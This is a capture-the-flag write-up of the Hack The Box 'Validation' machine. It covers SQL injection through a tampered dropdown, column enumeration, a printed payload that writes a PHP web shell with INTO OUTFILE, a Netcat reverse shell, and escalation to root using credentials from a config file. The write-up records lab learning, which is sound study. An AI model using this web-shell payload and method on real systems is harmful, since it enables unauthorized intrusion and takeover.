# Hack The Box - Validation | Write-up

> **Platform:** Hack The Box &nbsp;•&nbsp; **Category:** SQL Injection &nbsp;•&nbsp; **Difficulty:** Easy
>
> **Author:** Jithin Jelson

---

This was my first fully successful box at HackTheBox. I often find the boxes to be quite difficult, however because I was able to learn a lot of SQL injection techniques on HackTheBox Academy and PortSwigger, I was able to root this box.

---

## What I Learned

- UNION SELECT NULL,NULL,NULL is a better way to find the number of columns than UNION SELECT 1,2,3, since the NULLs avoid data type mismatch errors and give a better chance of the injection working, I picked this up recently from PortSwigger
- Not to assume the column count from habit, I went in expecting multiple columns and tried up to 7 NULLs before realising it was actually just 1
- A dropdown that you can't edit in the browser can still be tampered with using Burp Suite to trigger an SQL error

---

## Attack Overview
```mermaid
flowchart TD
    A[" Reconnaissance\nNmap scan · HTTP port found"]:::enum

    A --> B & C

    B[" Login page\nName input field"]:::enum
    C[" Login page\nCountry dropdown"]:::enum

    B -->|No SQL error\npayload reflected| D
    C -->|Edited via\nBurp Suite| E

    D[" Name input\nnot injectable"]:::dead
    E[" SQL error\ntriggered"]:::inject

    E --> F
    F[" Column enumeration\nUNION SELECT NULL · 1 column confirmed"]:::inject

    F --> G
    G[" Web shell written\nUNION SELECT INTO OUTFILE"]:::exploit

    G --> H & I

    H[" User flag\ncat /home/htb/user.txt"]:::obj
    I["Reverse shell\nNetcat · curl trigger"]:::exploit

    I --> J
    J[" Config file\nCredentials found"]:::exploit

    J --> K
    K["Root flag\nsu - · /root/root.txt"]:::obj

    classDef enum    fill:#D3D1C7,stroke:#5F5E5A,color:#2C2C2A
    classDef inject  fill:#CECBF6,stroke:#534AB7,color:#26215C
    classDef exploit fill:#F5C4B3,stroke:#993C1D,color:#4A1B0C
    classDef obj     fill:#9FE1CB,stroke:#0F6E56,color:#04342C
    classDef dead    fill:#FCEBEB,stroke:#A32D2D,color:#501313
```

### Reconnaissance

First, I got the target IP address by spawning the target. Once the target was available, I ran an Nmap scan to see what ports were open. I came across an HTTP port, so I presumed a website would be available on this box.

> **Note:** Normally I would enumerate all the endpoints before exploitation, but since I was purposefully looking for SQL injection boxes, the main page itself gave a good idea of where the injection should be placed.

The main page had a login screen where you would enter your name and then select a country, and then you would be greeted with a page like the following.

![Greeting page after login](images/01-greeting-page.png)
*Figure 1 - The greeting page shown after logging in*

---

## Finding the Injection Point

I first decided to check the name input to see if the SQL injection could be placed there.

![Testing the name input field](images/02-name-input-test.png)
*Figure 2 - Testing the name input field for SQL injection*

However, I did not receive any SQL error and my name just became whatever payload I entered.

![Name input returning the payload as-is](images/03-name-input-result.png)
*Figure 3 - The name input simply reflects the payload back, no SQL error*

So the only straightforward field for me to check was the dropdown box. Although we cannot edit the dropdown box manually, by using Burp Suite we were able to edit the dropdown field and trigger an SQL error.

![Triggering SQL error via Burp Suite](images/04-burp-dropdown-error.png)
*Figure 4 - Editing the dropdown field in Burp Suite to trigger an SQL error*

---

## Finding the Number of Columns

The next step in SQL injection methodology was to find the number of columns. We can do this in one of two ways: using the ORDER BY method or using the UNION SELECT method. I used the UNION SELECT method.

Rather than using payloads like `UNION SELECT 1,2,3 -- -`, I recently learned from PortSwigger that using `UNION SELECT NULL,NULL,NULL -- -` is a better approach. It maximises our opportunity to get an injection working because it avoids data type mismatch errors.

I initially went with two NULLs as I was expecting multiple columns from previous SQL exercise habits, but after trying it with 7 NULLs I figured I was doing something wrong and eventually I realised it was actually just 1 column.

![Testing UNION SELECT NULL payloads](images/05-union-select-null.png)
*Figure 5 - Testing UNION SELECT NULL to find the number of columns*

When I used just one column, the error went away.

![One column confirmed](images/06-one-column-confirmed.png)
*Figure 6 - Confirming a single column with UNION SELECT NULL*

---

## Exploitation Methodology

Usually my methodology once I locate the correct number of columns is to:

- Find out what database the app is using
- List all the databases using `information_schema`
- List all the tables in each database
- List the columns inside a table
- Retrieve the data
- Check for file privileges
- Check for super privileges
- Read the app source code to find the web root
- Create a web shell

But since this was an easy box, I presumed I would not have to do all of this. I assumed the database user would have root access, and the initial SQL error message had already shown me the web root directory (`/var/www/html/`).

---

## Writing a Web Shell

So I went and wrote a web shell to give myself access.

![Writing the web shell via SQL injection](images/07-webshell-write.png)
*Figure 7 - Writing the PHP web shell to the server via UNION SELECT INTO OUTFILE*

```sql
cn' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

And then when I put the following into the address bar to access my web shell, it was a success.

```
http://IP:PORT/shell.php?0=id
```

![Web shell confirming code execution](images/08-webshell-id.png)
*Figure 8 - Confirming remote code execution via the web shell*

---

## User Flag

I then proceeded to enumerate my findings to locate the user flag.

```
cat ../../../home/htb/user.txt
```

Now I needed to get the root flag. I initially tried to access the `/root` directory directly through my web shell, but I was restricted by file permissions.

![Root directory access restricted](images/09-root-dir-restricted.png)
*Figure 9 - File permissions blocking direct access to the root directory*

---

## Privilege Escalation

Because of this, I decided to catch a reverse shell so I could properly enumerate the system and escalate my privileges. First, I set up a listener on my machine at port 4444 using Netcat. Then, I used curl to trigger the web shell, passing it a URL-encoded Bash reverse shell command to connect back to me.

![Setting up the Netcat listener](images/10-reverse-shell-setup.png)
*Figure 10 - Setting up the Netcat listener and triggering the reverse shell*

![Reverse shell caught](images/11-reverse-shell-caught.png)
*Figure 11 - Reverse shell successfully caught*

And just like that I got my reverse shell.

I then searched the config file to see if there were any passwords and I came across credentials.

![Credentials found in config file](images/12-config-credentials.png)
*Figure 12 - Credentials discovered in the config file*

So I used the credentials to escalate my privileges to super user using `su -`.

![Escalating to root with su](images/13-su-root.png)
*Figure 13 - Escalating privileges to root*

Once I was super user I was able to get the final flag.

![Root flag retrieved](images/14-root-flag.png)
*Figure 14 - Retrieving the root flag*

---

<sub>Write-up by <b>Jithin Jelson</b></sub>
